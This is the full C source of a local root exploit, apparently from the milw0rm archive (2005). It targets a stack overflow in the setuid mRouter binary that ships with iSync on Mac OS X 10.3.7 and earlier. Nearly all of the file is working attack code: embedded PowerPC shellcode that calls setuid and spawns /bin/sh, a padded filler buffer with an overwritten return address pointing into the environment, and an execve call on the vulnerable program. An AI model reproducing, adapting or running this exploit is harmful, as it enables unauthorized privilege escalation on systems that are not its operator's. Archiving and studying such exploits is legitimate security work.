/*
  * fm-iSink.c
  * overflow in mRouter, suid binary used by iSync, on OSX <= 10.3.7
  *
  * written by -( nemo @ felinemenace.org )-
  *
  *                    _,'|             _.-''``-...___..--';)
  *                    /_ \'.      __..-' ,      ,--...--'''
  *                   <\    .`--'''       `     /'
  *                   `-';'               ;   ; ;
  *              __...--''     ___...--_..'  .;.'
  *          fL (,__....----'''       (,..--''
  *
  * http://pulltheplug.org and http://felinemenace.org.
  *
  * Bug discovered by Braden Thomas. Exploit by nemo.
  *
  * -( need a challenge...? )-
  * -( http://www.pulltheplug.org )-
  */

#include <sys/types.h>
#include <string.h>
#include <unistd.h>

#define VULNPROG 
"/System/Library/SyncServices/SymbianConduit.bundle/Contents/Resources/
mRouter"
#define MAXBUFSIZE 4096

char shellcode[] = // Shellcode by b-r00t, modified by nemo.
"\x7c\x63\x1a\x79\x40\x82\xff\xfd\x39\x40\x01\xc3\x38\x0a\xfe\xf4"
"\x44\xff\xff\x02\x39\x40\x01\x23\x38\x0a\xfe\xf4\x44\xff\xff\x02"
"\x60\x60\x60\x60\x7c\xa5\x2a\x79\x7c\x68\x02\xa6\x38\x63\x01\x60"
"\x38\x63\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8"
"\x3b\xc0\x01\x47\x38\x1e\xfe\xf4\x44\xff\xff\x02\x7c\xa3\x2b\x78"
"\x3b\xc0\x01\x0d\x38\x1e\xfe\xf4\x44\xff\xff\x02\x2f\x62\x69\x6e"
"\x2f\x73\x68";

char filler[MAXBUFSIZE];

int main(int ac, char **av)
{
unsigned int ret  = 0xbffffffa -  strlen(shellcode);
         char *args[] = { VULNPROG, "-v", "-a", filler, NULL };
char *env[]  = { "TERM=xterm", shellcode, NULL };

         memset(filler,(char)'A',sizeof(filler));
         memcpy(filler+MAXBUFSIZE-5,&ret,4);

execve(*args, args,env);

         return 0;
}

// milw0rm.com [2005-01-22]